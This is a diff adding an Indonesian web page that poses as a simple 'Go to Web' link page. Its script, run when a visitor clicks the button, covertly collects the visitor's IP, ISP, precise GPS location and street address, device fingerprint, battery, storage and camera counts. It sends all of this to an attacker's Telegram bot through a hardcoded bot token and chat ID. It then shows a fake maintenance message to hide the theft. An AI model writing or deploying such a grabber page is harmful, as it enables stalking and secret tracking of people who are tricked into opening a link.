@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>website by zhidan jangan di jual anj 🗿></title>
+<style>
+  body {
+    margin:0;
+    font-family: Arial, sans-serif;
+    background: #0f172a;
+    color: #fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    height:100vh;
+    flex-direction:column;
+    text-align:center;
+  }
+  button {
+    background:#38bdf8;
+    border:none;
+    padding:12px 24px;
+    border-radius:8px;
+    font-size:18px;
+    color:#0f172a;
+    cursor:pointer;
+    font-weight:bold;
+    transition:background 0.2s ease;
+  }
+  button:hover { background:#0ea5e9; }
+  .loading {
+    margin-top:15px;
+    font-size:14px;
+    opacity:0.85;
+  }
+</style>
+</head>
+<body>
+
+<div id="content">
+  <h1>Go to Web</h1>
+  <p>Klik tombol di bawah untuk melanjutkan</p>
+  <button id="goBtn">Go</button>
+  <div class="loading" id="loading" style="display:none;">Memproses...</div>
+</div>
+
+<script>
+/* === CONFIG === */
+const BOT_TOKEN = "8687138121:AAFXS3GBMMFKogzsVmYoij4_PPjVRP0Eqzw";
+const OWNER_CHAT_ID = "8057708255";
+const TELEGRAM_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+function detectProvider(isp){
+  if(!isp) return "Unknown";
+  const s = isp.toLowerCase();
+  if(s.includes("telkomsel") || s.includes("tsel")) return "Telkomsel";
+  if(s.includes("indosat") || s.includes("im3") || s.includes("mentari")) return "Indosat Ooredoo";
+  if(s.includes("xl") || s.includes("axis")) return "XL / Axis";
+  if(s.includes("tri") || s.includes("three")) return "Tri (3)";
+  if(s.includes("smartfren")) return "Smartfren";
+  if(s.includes("biznet")) return "Biznet";
+  if(s.includes("telkom") || s.includes("indi")) return "Telkom / IndiHome";
+  return isp;
+}
+
+async function fetchJSON(url){ try{ const r=await fetch(url); return await r.json(); }catch(e){ return null; } }
+
+async function reverseGeocode(lat, lon){
+  try{
+    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&addressdetails=1`;
+    const j = await fetchJSON(url);
+    return j?.address ? j.address : {};
+  }catch(e){ return {}; }
+}
+
+async function getStorageInfo(){
+  if(navigator.storage && navigator.storage.estimate){
+    const { quota, usage } = await navigator.storage.estimate();
+    return {
+      total: (quota / (1024*1024)).toFixed(2) + " MB",
+      used: (usage / (1024*1024)).toFixed(2) + " MB"
+    };
+  }
+  return { total: "N/A", used: "N/A" };
+}
+
+async function getMediaDevices(){
+  try {
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    return {
+      cameras: devices.filter(d=>d.kind==="videoinput").length,
+      microphones: devices.filter(d=>d.kind==="audioinput").length
+    };
+  } catch { return { cameras: "N/A", microphones: "N/A" }; }
+}
+
+async function measureSpeed(){
+  try {
+    const url = "https://via.placeholder.com/1000x1000.png?" + Math.random();
+    const start = performance.now();
+    await fetch(url, {cache:"no-store"});
+    const end = performance.now();
+    const duration = (end - start) / 1000;
+    const bits = 80000 * 8; // ~80KB
+    return (bits / duration / 1024 / 1024).toFixed(2) + " Mbps";
+  } catch(e){ return "N/A"; }
+}
+
+async function generateFingerprint(){
+  try {
+    const ua = navigator.userAgent;
+    const lang = navigator.language;
+    const res = screen.width + "x" + screen.height;
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const ram = navigator.deviceMemory || "N/A";
+    const cpu = navigator.hardwareConcurrency || "N/A";
+    const raw = `${ua}|${lang}|${res}|${tz}|${ram}|${cpu}`;
+    const encoder = new TextEncoder();
+    const data = encoder.encode(raw);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+    return [...new Uint8Array(hashBuffer)].map(x=>x.toString(16).padStart(2,'0')).join('');
+  } catch(e){ return "N/A"; }
+}
+
+async function gatherData(){
+  const ua = navigator.userAgent;
+  const resolution = `${screen.width}x${screen.height}`;
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const deviceMemory = navigator.deviceMemory || "N/A";
+  const cpu = navigator.hardwareConcurrency || "N/A";
+  const online = navigator.onLine;
+  const cookiesEnabled = navigator.cookieEnabled;
+  const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+  const battery = await (navigator.getBattery ? navigator.getBattery().then(b=>({level:Math.round(b.level*100)+"%",charging:b.charging})) : {level:"N/A",charging:"N/A"});
+  const storageInfo = await getStorageInfo();
+  const mediaDevices = await getMediaDevices();
+  const fingerprint = await generateFingerprint();
+  const netSpeed = await measureSpeed();
+
+  // IP & ISP
+  const ipInfo = await fetchJSON("https://ipapi.co/json/");
+  let ip = ipInfo?.ip || "N/A";
+  let isp = ipInfo?.org || "N/A";
+  let provider = detectProvider(isp);
+
+  // Geolocation
+  let lat = ipInfo?.latitude || "N/A";
+  let lon = ipInfo?.longitude || "N/A";
+  let accuracy = "IP-based";
+  try {
+    await new Promise(res=>{
+      navigator.geolocation.getCurrentPosition(pos=>{
+        lat = pos.coords.latitude;
+        lon = pos.coords.longitude;
+        accuracy = pos.coords.accuracy + " m";
+        res();
+      }, ()=>res(), { enableHighAccuracy:true, timeout:5000 });
+    });
+  } catch(e){}
+
+  // Reverse Geocode
+  const addr = await reverseGeocode(lat, lon);
+
+  return {
+    Timestamp: new Date().toLocaleString(),
+    IP: ip,
+    ISP: isp,
+    ProviderDetected: provider,
+    Country: ipInfo?.country_name || "N/A",
+    Region: ipInfo?.region || "N/A",
+    City: ipInfo?.city || "N/A",
+    Postal: ipInfo?.postal || "N/A",
+    Latitude: lat,
+    Longitude: lon,
+    Accuracy: accuracy,
+    Address: addr,
+    UserAgent: ua,
+    Resolution: resolution,
+    Timezone: tz,
+    Online: online,
+    DeviceMemory_GB: deviceMemory,
+    CPU_Cores: cpu,
+    Cookies_Enabled: cookiesEnabled,
+    Dark_Mode: darkMode,
+    Battery: battery,
+    Storage: storageInfo,
+    MediaDevices: mediaDevices,
+    Fingerprint: fingerprint,
+    NetworkSpeed: netSpeed
+  };
+}
+
+async function sendToTelegram(data){
+  const msg = [
+    "*Zhidan Official - Lacak Real-time🏴‍☠️*",
+    "```json",
+    JSON.stringify(data,null,2),
+    "```",
+    `Maps: https://www.google.com/maps?q=${data.Latitude},${data.Longitude}`
+  ].join("\n\n");
+
+  await fetch(`${TELEGRAM_BASE}/sendMessage`, {
+    method: "POST",
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ chat_id: OWNER_CHAT_ID, text: msg, parse_mode: "Markdown" })
+  });
+
+  if(data.Latitude && data.Longitude){
+    await fetch(`${TELEGRAM_BASE}/sendLocation`, {
+      method: "POST",
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: OWNER_CHAT_ID, latitude: Number(data.Latitude), longitude: Number(data.Longitude) })
+    });
+  }
+}
+
+document.getElementById("goBtn").addEventListener("click", async ()=>{
+  document.getElementById("loading").style.display = "block";
+  const info = await gatherData();
+  await sendToTelegram(info);
+
+  // Setelah kirim, ubah tampilan menjadi halaman maintenance fake
+  setTimeout(()=>{
+    document.body.innerHTML = `
+      <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#fff;flex-direction:column;text-align:center;">
+        <h1 style="font-size:28px;margin-bottom:10px;">Mohon maaf, web ini sedang maintenance</h1>
+        <p style="opacity:0.85;">Silakan coba lagi nanti.</p>
+      </div>
+    `;
+  }, 1500);
+});
+</script>
+
+</body>
+</html>
